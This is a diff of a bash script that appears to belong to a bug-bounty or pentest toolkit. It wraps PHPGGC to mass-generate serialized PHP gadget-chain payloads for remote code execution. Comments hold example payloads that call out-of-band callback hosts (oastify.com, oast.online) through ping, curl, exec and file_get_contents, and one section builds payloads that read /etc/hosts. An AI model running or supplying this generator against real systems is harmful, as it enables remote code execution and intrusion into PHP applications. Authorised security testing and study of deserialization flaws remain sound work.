@@ -1,12 +1,11 @@
 #! /usr/bin/bash
 
-
-Adding new gadgets to our list:
-cat allggc.txt|grep "RCE (Command)" | sed 's/ .*//' >> command_ggc.txt
-
+cd /home/snoopy/tools/phpggc
+./phpggc -l >> allggc.txt
 # -------------------------------------------------------------------
 # *** PHP code *** 
-cat allggc.txt|grep "PHP code" | sed 's/ .*//' >> phpcode.txt
+cat allggc.txt|grep "PHP Code" | sed 's/ .*//' >> phpcode.txt
+# bash payloadgen.sh -l phpcode.txt -p "file_get_contents('http://jobnzafwbbvp02wjtk2x9o9kmbs2gu4j.oastify.com');"  -o 0payload.txt
 
 while getopts 'l:p:o:' flag; do
   case "${flag}" in
@@ -16,21 +15,21 @@ while getopts 'l:p:o:' flag; do
   esac
 done
 
-# -p "exec('ping -c 4 ck37jm8f8r9vilqcfju0pn5u5rr4qrb9o.oast.online');" 
-# -p "file_get_contents('https://ck37jm8f8r9vilqcfju0pn5u5rr4qrb9o.oast.online');"
+# -p "exec('ping -c 4 jobnzafwbbvp02wjtk2x9o9kmbs2gu4j.oastify.com');" 
+# -p "file_get_contents('http://jobnzafwbbvp02wjtk2x9o9kmbs2gu4j.oastify.com');"
 while IFS= read -r line
 do 
-     phpggc -s "$line" "$payload" >> "$output"
+     ./phpggc -s "$line" "$payload" >> "$output"
 done < "$list"
 
 
 
 
 # -------------------------------------------------------------------
-
 # *** Command *** 
-cat allggc.txt|grep "RCE (Command)" | sed 's/ .*//' >> command_ggc.txt
-
+cat allggc.txt|grep "RCE: Command" | sed 's/ .*//' >> command_ggc.txt
+# bash payloadgen.sh -l command_ggc.txt -p "ping jobnzafwbbvp02wjtk2x9o9kmbs2gu4j.oastify.com" -o 0payload.txt
+# bash payloadgen.sh -l command_ggc.txt -p "curl jobnzafwbbvp02wjtk2x9o9kmbs2gu4j.oastify.com" -o 0payload.txt
 
 while getopts 'l:p:o:' flag; do
   case "${flag}" in
@@ -42,7 +41,7 @@ done
 
 while IFS= read -r line
 do 
-     phpggc -s "$line" "$payload" >> "$output"
+     ./phpggc -s "$line" "$payload" >> "$output"
 done < "$list"
 # -------------------------------------------------------------------
 
@@ -89,4 +88,4 @@ done
 while IFS= read -r line
 do 
      phpggc -s "$line" /etc/hosts >> "$output"
-done < "$list"
+done < "$list"  
